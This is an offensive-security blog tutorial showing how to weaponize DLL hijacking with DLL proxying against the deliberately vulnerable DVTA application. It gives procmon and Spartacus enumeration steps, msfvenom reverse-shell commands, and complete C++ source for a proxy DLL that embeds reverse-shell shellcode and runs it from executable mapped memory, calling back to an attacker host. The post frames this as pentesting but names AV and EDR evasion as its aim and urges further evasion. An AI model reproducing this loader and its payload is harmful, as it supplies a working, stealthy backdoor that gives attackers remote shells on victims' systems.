# Weaponizing DLL Hijacking via DLL Proxying

## Theory

DLL Hijacking is one of the techniques to dechain downloading from executing phase. This technique can drastically help your C2 implant to pass AVs and EDRs. </br > </br >

Since the regular DLL Hijacking is super simple to perform, it can be a little challenging to weaponize it in real environment.
Sometimes it can be enough to perform simple DLL Hijacking just to prove a binary is vulnerable, this is often done in specific pentesting scenarios. This blog covers the case of "stealthness" (evading AV vendors with this technique), so we will go over some caviats in the next sections.
I already have a video on this topic, so if you prefer watching instead of reading, feel welcomed to my channel: https://www.youtube.com/watch?v=KhVxglO2mcM
Also, I have a Discord server for sharing information, knowledge and experience. If you want to be a part of such community, you can join from here: https://discord.gg/dWCe5ZMvtQ
DLL Hijacking
DLL Hijacking is attack for specific preinstalled binaries. When a binary is executed, and during runtime, it is actively loading functions from various DLLs. DLLs (Dynamic Link Library) are files, designed to share various functions between processes. The problem arises when the binary is trying to load a DLL from not existing path, while we (as intruders) have write access over it!
When a binary cannot load a DLL from its current directory, it will start searching for it in various sub and system directories. Do not forget to scan your write access on all of them.
Enumerate DLL Hijacking
Enumeration often is being done with procmon. In a nutshell, procmon is a legitimate MS tool for monitoring process activity. It can be downloaded from: https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
After opening procmon, several filter must be applied:
Filtering the binary by name
Filtering the path to be ending withÂ .dll
Filtering the result to contain NOT FOUND

After the filters are applied, make sure to start the binary, and if everything is setup correctly, it can look smth like this:
For the sake of the demo, I am using DVTA as a targeted vulnerable application (https://github.com/srini0x00/dvta)
All of the results from the screenshot, show a potential DLL hijack vulnerability, if we have right access over any of the directories, we can overwrite the not found DLL with a custom malicious DLL.
For the sake of the testing I chose "C:\Users\user\Desktop\dvta\DVTA\bin\x64\Release\CRYPTSP.dll" for my hijackable DLL.
Observe the full path carefully, it is in a directory, that my user have write access over. There are more not found DLLs, but most of them are inside "C:\Windows" which we do not have permissions by default.
The enumeration process revealed "CRYPTSP.dll" to be a great target!
Executing DLL Hijacking
For a simple pentest scenario, sometimes it is enough just to prove the binary is vulnerable. Let's create a sample DLL and perform the attack.
For generating a sample DLL, we can use either custom made one (recommended), or a msfvenom one. For the sake of the demo, I created the following custom DLL, to spawn "calc.exe" process.
// dllmain.cpp : Defines the entry point for the DLL application.
```
#include "pch.h"
#include <stdlib.h>
#include <windows.h>

void calc();

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
 HANDLE t;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
  t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)calc, NULL, 0, NULL);
  CloseHandle(t);
  break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void calc()
{
 system("calc.exe");
}
```

DLL's entry point is called "DLLMain" and it executes code via various conditions on how the DLL is called. When a process reads a function from the DLL it generally uses "DLL_PROCESS_ATTACH". We will store our custom code there!
After renaming the DLL "CRYPTSP.dll" and placing it on the vulnerable directory, we can confirm DLL hijacking vulnerability, after executing the DVTA.exe binary:
DLL Proxying
Theory
While performing the previous DLL Hijacking, the chances are that the binary will break either on start up or at runtime after loading our custom DLL. We can confirm that by replacing the previous DLL with a one from msfvenom for reverse shell callback.
During the demo I used the following msfvenom payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f dll -o CRYPTSP.dll
After executing the DLL hijacked binary, we can observe that the shell callback is present, but the binary is not yet started.
This is because of 2 problems:
The thread is occupied by the reverse shell.
The execution flow is unknown, meaning after executing the shell, the binary is still corrupted.

Setup
To solve this problem we must perform something called DLL proxying. It looks like this:
source: https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL proxying is a technique to restore the native DLL execution flow (function calls) so the binary is not corrupted. Luckily, there are tools which can export the functions and even generate a CPP template.
One such tool is called spartacus (https://github.com/Accenture/Spartacus)
Spartacus requires procmon to be installed.
To run spartacus, you can follow the syntax:
.\Spartacus-v1.2.0-x64.exe --procmon C:\Users\user\Desktop\Procmon64.exe --pml test.plm --csv ./output.csv --exports . --verbose
Spartacus will automatically engage with procmon, setup filters and find DLL hijackable binaries. After finding such, it will try to export all the functions it needs from the mentioned DLL.
After executing the command, make sure to execute the targeted binary, and then terminate spartacus by pressing enter, it will generate similar output:
From the output, spartacus founds which DLLs are hijackable, exports their functions and generates a cpp template for the DLL.
The cpp template (for CRYPTSP.dll) looks like this in my example:
#pragma once

#pragma comment(linker,"/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1")
#pragma comment(linker,"/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2")
#pragma comment(linker,"/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3")
#pragma comment(linker,"/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4")
#pragma comment(linker,"/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5")
#pragma comment(linker,"/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6")
#pragma comment(linker,"/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7")
#pragma comment(linker,"/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8")
#pragma comment(linker,"/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9")
#pragma comment(linker,"/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10")
#pragma comment(linker,"/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11")

#include <windows.h>

VOID Payload() {
    // Run your payload here.
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Payload();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
Weaponizing the DLL Hijacking
Let's create new CPP DLL project:
During the demo, I am using Visual Studio 2017 on Commando VM.
Now let's tweek the malicious template from spartacus. I created "Offensive CPP" repository, its idea is to host a malicious independent snippets, which can be used in various offensive scenarios. Let's copy some shellcode execution code. During the demo, I am using the "FileMap" snippet (https://github.com/lsecqt/OffensiveCpp/blob/main/Shellcode%20Execution/FileMap/directPointerToFileMap.cpp)
The last step is to generate a shellcode from msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f c
And combine the pieces by compiling the custom DLL as x64/Release:
#pragma once

#pragma comment(linker,"/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1")
#pragma comment(linker,"/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2")
#pragma comment(linker,"/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3")
#pragma comment(linker,"/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4")
#pragma comment(linker,"/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5")
#pragma comment(linker,"/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6")
#pragma comment(linker,"/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7")
#pragma comment(linker,"/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8")
#pragma comment(linker,"/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9")
#pragma comment(linker,"/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10")
#pragma comment(linker,"/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11")

#include <windows.h>
#include <iostream>

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x6e\x89"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

VOID Payload() {
 ShowWindow(GetConsoleWindow(), SW_HIDE);

 HANDLE mem_handle = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(buf), NULL);

 void* mem_map = MapViewOfFile(mem_handle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0x0, 0x0, sizeof(buf));

 std::memcpy(mem_map, buf, sizeof(buf));

 std::cout << ((int(*)())mem_map)() << std::endl;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
 switch (fdwReason)
 {
 case DLL_PROCESS_ATTACH:
  Payload();
  break;
 case DLL_THREAD_ATTACH:
  break;
 case DLL_THREAD_DETACH:
  break;
 case DLL_PROCESS_DETACH:
  break;
 }
 return TRUE;
}
After performing DLL Hijacking with the compiled DLL, the binary executes as normal, while we receive the shell callback.
Conclusion
As mentioned before, DLL Hijacking on its own is a valid finding and often during pentests, it can be enough just to prove that it is vulnerable. However, in more complex cases, you may need to operate more stealthy. Since the default DLL Hijacking is corrupting the binary, this can be a huge IOC (Indicator Of Compromise). To evade being detected, I recommend sticking to as much as possible to custom made DLLs, custom made shellcode and do not forget to implement additional AV/EDR evasion techniques alongside with the DLL Proxying.
Thank you for your attention, I really hope this blog is useful, if so, make sure to follow me on:
Youtube: https://www.youtube.com/@Lsecqt
Twitter: https://twitter.com/lsecqt
Github: https://github.com/lsecqt